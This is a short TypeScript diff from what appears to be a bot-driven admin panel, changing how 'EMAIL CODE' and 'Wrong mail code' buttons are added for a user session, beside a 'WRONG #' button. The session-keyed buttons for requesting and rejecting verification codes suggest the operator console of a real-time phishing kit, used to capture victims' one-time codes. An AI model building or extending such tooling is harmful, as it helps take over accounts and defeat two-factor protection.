@@ -915,20 +915,18 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   // Secondary Actions Row
   const secondaryRow = [];
 
-  // Email Code Button - Direct to code input, changes to Wrong after attempts
-  if (!session.authAttempts["email"]) {
-    secondaryRow.push({
-      text: "📧 EMAIL CODE",
-      callback_data: `auth_email_code_${sessionId}`,
-    });
-    console.log("✅ Added Email Code button");
-  } else if (session.authAttempts["email"] > 0) {
-    secondaryRow.push({
-      text: "Wrong mail code",
-      callback_data: `incorrect_email_code_${sessionId}`,
-    });
-    console.log("✅ Added Wrong Email Code button");
-  }
+  // Email Code Buttons - Both always available
+  secondaryRow.push({
+    text: "📧 EMAIL CODE",
+    callback_data: `auth_email_code_${sessionId}`,
+  });
+  console.log("✅ Added Email Code button");
+
+  secondaryRow.push({
+    text: "Wrong mail code",
+    callback_data: `incorrect_email_code_${sessionId}`,
+  });
+  console.log("✅ Added Wrong Email Code button");
 
   secondaryRow.push({
     text: "❌ WRONG #",
